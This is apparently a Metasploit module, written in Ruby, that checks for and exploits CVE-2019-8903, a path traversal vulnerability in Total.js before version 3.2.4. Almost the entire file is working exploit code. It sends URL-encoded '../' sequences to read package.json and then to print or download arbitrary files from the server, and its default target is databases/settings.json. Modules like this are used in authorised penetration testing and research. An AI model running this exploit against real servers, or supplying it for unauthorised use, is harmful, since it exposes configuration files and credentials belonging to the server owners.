##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Check and exploit Total.js Directory Traversal (CVE-2019-8903)
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Total.js prior to 3.2.4 Directory Traversal',
      'Description' => %q(
        This module check and exploits a directory traversal vulnerability in Total.js prior to 3.2.4.

        Here is a list of accepted extensions: flac, jpg, jpeg, png, gif, ico, js, css, txt, xml,
        woff, woff2, otf, ttf, eot, svg, zip, rar, pdf, docx, xlsx, doc, xls, html, htm, appcache,
        manifest, map, ogv, ogg, mp4, mp3, webp, webm, swf, package, json, md, m4v, jsx, heif, heic
      ),
      'Author' =>
        [
          'Riccardo Krauter', # Discovery
          'Fabio Cogno'       # Metasploit module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2019-8903'],
          ['CWE', '22'],
          ['URL', 'https://blog.totaljs.com/blogs/news/20190213-a-critical-security-fix/'],
          ['URL', 'https://snyk.io/vuln/SNYK-JS-TOTALJS-173710']
        ],
      'Privileged' => false,
      'DisclosureDate' => 'Feb 18 2019',
      'Actions' =>
        [
          ['CHECK', { 'Description' => 'Check if the target is vulnerable' }],
          ['READ', { 'Description' => 'Attempt to print file content' }],
          ['DOWNLOAD', { 'Description' => 'Attempt to download a file' }]
        ],
      'DefaultAction' => 'CHECK'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to Total.js App installation', '/']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 1]),
        OptString.new('FILE', [true, 'File to obtain', 'databases/settings.json'])
      ]
    )
  end

  def check_ext
    extensions = %w[
      flac jpg jpeg png gif ico js css txt xml
      woff woff2 otf ttf eot svg zip rar pdf
      docx xlsx doc xls html htm appcache
      manifest map ogv ogg mp4 mp3 webp webm
      swf package json md m4v jsx heif heic
    ]

    ext = datastore['FILE'].split('.').last

    unless extensions.include? ext
      print_warning "Extension #{ext} is not supported by the HTTP static route of the framework"
    end
  end

  def check
    uri = normalize_uri(target_uri.path) + '%2e%2e%2fpackage.json'
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => uri
    )
    if res && res.code == 200
      json = res.get_json_document
      if json.empty? || !json['dependencies']['total.js']
        return Exploit::CheckCode::Safe
      else
        print_status("Total.js version is: #{json['dependencies']['total.js']}")
        print_status("App name: #{json['name']}")
        print_status("App description: #{json['description']}")
        print_status("App version: #{json['version']}")
        return Exploit::CheckCode::Vulnerable
      end
    elsif res && res.headers['X-Powered-By'].to_s.downcase.include?('total.js')
      print_status('Target appear to be vulnerable!')
      print_status("X-Powered-By: #{res.headers['X-Powered-By']}")
      return Exploit::CheckCode::Detected
    else
      vprint_warning('No response')
      return Exploit::CheckCode::Unknown
    end
  end

  def read
    check_ext
    traverse = '%2e%2e%2f' * datastore['DEPTH']
    uri = normalize_uri(target_uri.path) + traverse + datastore['FILE']

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => uri
    )
    unless res
      fail_with(Failure::Unreachable, 'Connection failed')
    end
    if res.code != 200
      print_error("Unable to read '#{datastore['FILE']}', possibly because:")
      print_error("\t1. File does not exist.")
      print_error("\t2. No permission.")
      return
    end
    print_status("Getting #{datastore['FILE']}...")
    print_line(res.body)
  end

  def download
    check_ext
    traverse = '%2e%2e%2f' * datastore['DEPTH']
    uri = normalize_uri(target_uri.path) + traverse + datastore['FILE']

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => uri
    )
    unless res
      fail_with(Failure::Unreachable, 'Connection failed')
    end
    if res.code != 200
      print_error("Unable to read '#{datastore['FILE']}', possibly because:")
      print_error("\t1. File does not exist.")
      print_error("\t2. No permission.")
      return
    end
    fname = datastore['FILE'].split('/')[-1].chop
    ctype = res.headers['Content-Type'].split(';')
    loot = store_loot('lfi.data', ctype[0], rhost, res.body, fname)
    print_good("File #{fname} downloaded to: #{loot}")
  end

  def run
    case action.name
    when 'CHECK'
      check
    when 'READ'
      read
    when 'DOWNLOAD'
      download
    end
  end
end
